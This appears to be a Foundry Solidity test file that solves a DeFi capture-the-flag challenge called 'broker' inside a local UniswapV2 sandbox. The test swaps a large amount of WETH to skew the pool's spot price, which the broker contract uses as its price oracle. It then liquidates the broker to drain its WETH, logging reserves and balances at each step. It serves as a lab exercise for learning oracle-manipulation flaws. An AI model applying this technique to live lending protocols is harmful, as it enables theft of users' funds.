// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../../src/04.broker/Setup.sol";
import "./uniswapV2/erc20.sol";
import "./uniswapV2/factory.sol";
import "./uniswapV2/pair.sol";
import "./uniswapV2/router.sol";
import "./interface.sol";

contract attackTest is Test {
    string constant weth9_Artifact = 'out/tools/helper_WETH9.sol/WETH9.json';

    Setup public level;
    IWETH9 public weth;
    Broker public broker;

    // uniswapV2系统
    Iu_factory u_factory;
    Iu_router u_router;
    Token Ltoken;
    IPair pair;

    function setUp() public {
        // 创建WETH9合约
        weth = IWETH9(deployHelper_weth(weth9_Artifact));
        vm.label(address(weth), "weth");

        // 创建uniswapV2系统

        // 部署u_factory
        u_factory = Iu_factory(deployHelper_u_factory());
        vm.label(address(u_factory), "u_factory");

        // 部署u_router
        u_router = Iu_router(deployHelper_u_router(address(u_factory), address(weth)));
        vm.label(address(u_router), "u_router");
        
        // 初始化题目合约
        level = new Setup{value: 50 ether}(address(weth), address(u_factory));
        vm.label(address(level), "level");

        broker = level.broker();
        vm.label(address(broker), "broker");
        Ltoken = level.token();
        vm.label(address(Ltoken), "Ltoken");

        // 标记pair
        pair = IPair(pairFor(address(u_factory), address(Ltoken), address(weth)));
        vm.label(address(pair), "pair");
    }

    function test_isComplete() public payable{
        
        // 获得一些WETH，用来在池子里swap
        uint256 amount_WETH = 25 ether;
        weth.deposit{value: amount_WETH}();

        console.log("==========before attack=========");
        (uint112 reserve0_before, uint112 reserve1_before , uint32 z ) = pair.getReserves();
        console.log("the pool");
        console.log("   reserve0_WETH_before",reserve0_before);
        console.log("   reserve1_Ltoken_before",reserve1_before);
        console.log("My asset");
        console.log("   WETH", weth.balanceOf(address(this)));
        console.log("   Ltoken", Ltoken.balanceOf(address(this)));
        console.log("WETH price", broker.rate());
        console.log("liquidate's WETH price 15000");
        console.log("broker's WETH", weth.balanceOf(address(broker)));

        // 准备
        weth.approve(address(broker), type(uint256).max);
        weth.approve(address(u_router), type(uint256).max);
        Ltoken.approve(address(broker), type(uint256).max);
        Ltoken.approve(address(u_router), type(uint256).max);

        // 把WETH换成Ltoken
        address[] memory path = new address[](2);
		path[0] = address(weth);
		path[1] = address(Ltoken);
		u_router.swapExactTokensForTokens(amount_WETH, 0, path, address(this), type(uint256).max);

        console.log();
        console.log("======after swap 25WETH for Ltoken======");
        (uint112 reserve0_afterSwap, uint112 reserve1_afterSwap , uint32 zx ) = pair.getReserves();
        console.log("the pool");
        console.log("   reserve0_WETH_after",reserve0_afterSwap);
        console.log("   reserve1_Ltoken_after",reserve1_afterSwap);
        console.log("My asset");
        console.log("   WETH", weth.balanceOf(address(this)));
        console.log("   Ltoken", Ltoken.balanceOf(address(this)));
        console.log("WETH price",broker.rate());
        console.log("broker's WETH",weth.balanceOf(address(broker)));

        // 开始清算
        uint amount_liquidate = 24 ether * broker.rate();
        broker.liquidate(address(level), amount_liquidate);

        console.log();
        console.log("==========after liquidate=========");
        (uint112 reserve0_afterLiquidate, uint112 reserve1_afterLiquidate , uint32 zzz ) = pair.getReserves();
        console.log("the pool");
        console.log("   reserve0_WETH_after",reserve0_afterLiquidate);
        console.log("   reserve1_Ltoken_after",reserve1_afterLiquidate);
        console.log("My asset");
        console.log("   WETH", weth.balanceOf(address(this)));
        console.log("   Ltoken", Ltoken.balanceOf(address(this)));
        console.log("WETH price",broker.rate());
        console.log("broker's WETH",weth.balanceOf(address(broker)));
        
        assertEq(level.isSolved(), true);
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        
        pair = address(uint160(uint256(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                // 这个是我编译出来的bytecode的哈希值
                hex'f0e60e1779ec5ef88ad36bab3e3e0cad28189353ab5bf1f719a2855de1c74e52' // init code hash
            )))));
    }
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // 部署WETH
    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }

    // 部署u_ERC20
    function deployHelper_u_ERC20() public returns (address addr) {
        bytes memory bytecode = BYTECODE_erc20;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }

    // 部署u_factory
    function deployHelper_u_factory() public returns (address addr) {
        bytes memory bytecode = BYTECODE_factory;
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(msg.sender)));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

    // 部署u_router
    function deployHelper_u_router(address _u_factory, address _weth) public returns (address addr) {
        bytes memory bytecode = BYTECODE_router;
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(_u_factory), address(_weth)));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }

}